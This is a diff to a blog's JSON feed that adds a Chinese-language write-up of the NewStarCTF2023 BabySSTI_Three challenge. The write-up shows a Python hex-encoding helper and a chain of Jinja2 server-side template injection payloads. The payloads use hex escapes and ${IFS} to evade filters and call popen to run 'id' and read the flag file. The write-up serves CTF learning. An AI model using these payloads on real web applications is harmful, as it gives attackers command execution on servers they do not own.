@@ -5,6 +5,17 @@
     "home_page_url": "http://odiws.github.io",
     "items": [
         {
+            "id": "http://odiws.github.io/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/",
+            "url": "http://odiws.github.io/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/",
+            "title": "NewStarCTF2023新生赛_BabySSTI_Three",
+            "date_published": "2025-01-26T14:04:33.000Z",
+            "content_html": "<p>NewStarCTF2023 新生赛_BabySSTI_Three</p>\n<p>之前用的是字符串逆序绕过，这里过滤了:，然后用十六进制绕过即可</p>\n<pre><code>def hex_payload(payload):\n\tres_payload = ''\n\tfor i in payload:\n\t\ti = &quot;\\\\x&quot; + hex(ord(i))[2:]\n\t\tres_payload += i\n\tprint('[+]&quot;&#123;&#125;&quot; Convert to hex: &quot;&#123;&#125;&quot;'.format(payload,res_payload))\n\nif __name__ == '__main__':\n\tpayload = &quot;__class__&quot;\n\thex_payload(payload)\n</code></pre>\n<pre><code>&#123;&#123;''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x73\\x5f\\x5f'][0]&#125;&#125;\n\n&#123;&#123;''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x73\\x5f\\x5f'][0]['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()&#125;&#125;\n\n&#123;&#123;''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x73\\x5f\\x5f'][0]['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]['\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f']['\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f']['\\x70\\x6f\\x70\\x65\\x6e']('id').read()&#125;&#125;\n\n&#123;&#123;''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x73\\x5f\\x5f'][0]['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]['\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f']['\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f']['\\x70\\x6f\\x70\\x65\\x6e']('tail$&#123;IFS&#125;/fl*').read()&#125;&#125;\n</code></pre>\n<p>有了命令执行之后还需要有点绕过即可读取到 flag<br>\n<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262206487.png\" alt=\"image-20250126220622301\"></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTI3MzU0NDky\">BUUCTF NewStarCTF 公开赛赛道 Week5 Writeup_buuctf week5-CSDN 博客</span></p>\n",
+            "tags": [
+                "buuctf",
+                "ssti"
+            ]
+        },
+        {
             "id": "http://odiws.github.io/2024/10/15/FBCTF2019-Event/",
             "url": "http://odiws.github.io/2024/10/15/FBCTF2019-Event/",
             "title": "[FBCTF2019]Event",
